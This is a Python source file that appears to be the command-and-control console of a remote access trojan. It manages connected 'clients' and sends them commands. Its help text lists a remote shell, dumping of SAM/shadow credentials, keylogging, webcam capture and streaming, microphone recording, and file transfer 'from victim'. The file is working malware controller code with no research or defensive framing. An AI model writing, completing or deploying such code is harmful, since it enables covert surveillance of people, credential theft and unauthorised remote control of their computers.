from typing import Optional
from .logger import logger
from .protocol import build_command
from .file_transfer import upload_file
from .file_transfer import download_file

REMOTE_COMMANDS = {
    "help",
    "download",
    "upload",
    "shell",
    "ipconfig",
    "screenshot",
    "search",
    "hashdump",
    "keylogger",
    "webcam_snapshot",
    "webcam_stream",
    "record_audio"
}

def handle_command(command: str, client_manager):
    parts = command.strip().split()

    if not parts:
        return

    cmd = parts[0].lower()

    if cmd == "list":
        list_clients(client_manager)

    elif cmd == "interact":
        if len(parts) < 2:
            logger.debug("[!] Usage: interact <client_id>")
            return

        interact_with_client(parts[1], client_manager)

    elif cmd == "help":
        show_help()

    else:
        logger.error(f"[!] Unknown command: {cmd}")


#-------------- COMMANDS IMPLEMENTATION -------------#
def list_clients(client_manager):
    clients = client_manager.get_all()

    if not clients:
        logger.info("No connected clients.")
        return

    logger.info("Connected clients:")
    logger.info("-" * 40)

    for client in clients:
        info = client.info()

        logger.info(
            f"ID: {info['id']} | IP: {info['ip']} | Status: {info['status']}"
        )

    logger.info("-" * 40)



def interact_with_client(client_id: str, client_manager):
    client = client_manager.get(client_id)

    if not client or client.status == "disconnected":
        logger.warning("Client unavailable")
        return

    logger.info(f"Session started with {client.id} ({client.addr[0]})")

    while True:
        try:
            cmd = input(f"session({client.id}) > ").strip()

            if not cmd:
                continue

            # ---------------- LOCAL COMMANDS ---------------- #
            if cmd == "back":
                logger.info("Leaving session...")
                break

            if cmd == "help":
                session_help()
                continue

            if cmd == "disconnect":
                client.send(build_command("disconnect"))
                client.close()
                client_manager.remove(client.id)
                logger.warning("Client disconnected")
                break

            # ---------------- VALIDATION ---------------- #
            base_cmd = cmd.split()[0]

            if base_cmd not in REMOTE_COMMANDS:
                logger.warning("Unknown command")
                continue

            # ---------------- SEND (PROTOCOL FIX) ---------------- #
            packet = build_command(base_cmd, cmd.split()[1:])
            client.send(packet)

            response = client.receive()

            if response:
                logger.info(response.get("result", str(response)))
            else:
                logger.warning("No response")

        except KeyboardInterrupt:
            logger.warning("Use 'back' to exit session")

        except Exception as e:
            logger.exception(f"Session error: {e}")
            break


def send_command_to_client(command: str, client):
    try:
        from .protocol import build_command

        packet = build_command(command)
        client.send(packet)

        response = client.receive()

        if response:
            logger.info(response.get("result", str(response)))
        else:
            logger.warning("No response.")

    except Exception as e:
        logger.exception(f"Communication error: {e}")


def print_client_info(client):
    info = client.info()

    logger.info("\nClient info:")
    logger.info(f"ID      : {info['id']}")
    logger.info(f"IP      : {info['ip']}")
    logger.info(f"Status  : {info['status']}")


def handle_upload(command: str, client):
    parts = command.split()

    if len(parts) < 3:
        logger.debug("[!] Usage: upload <local_path> <remote_path>")
        return

    local_path = parts[1]
    remote_path = parts[2]

    try:
        from file_transfer import upload_file
        upload_file(client, local_path, remote_path)
        logger.info("[+] File uploaded.")

    except Exception as e:
        logger.exception(f"[!] Upload failed: {e}")


def handle_download(command: str, client):
    parts = command.split()

    if len(parts) < 3:
        logger.debug("[!] Usage: download <remote_path> <local_path>")
        return

    remote_path = parts[1]
    local_path = parts[2]

    try:
        from file_transfer import download_file
        download_file(client, remote_path, local_path)
        logger.info("[+] File downloaded.")

    except Exception as e:
        logger.exception(f"[!] Download failed: {e}")


#----------- HELPERS --------------#
def show_help():
    logger.debug("""
Server commands:
    list                List connected clients
    interact <id>       Interact with a client
    help                Show this help
    exit                Exit server
""")


def session_help():
    logger.info("""
Available commands:

help               Show this help
back               Exit session
disconnect         Disconnect client

download           Get file from victim
upload             Send file to victim
shell              Open remote shell
ipconfig           Network configuration
screenshot         Capture screen
search             Find file on system
hashdump           Dump credentials (SAM/shadow)
keylogger          Start keylogging
webcam_snapshot    Take webcam photo
webcam_stream      Live webcam feed
record_audio       Record microphone
""")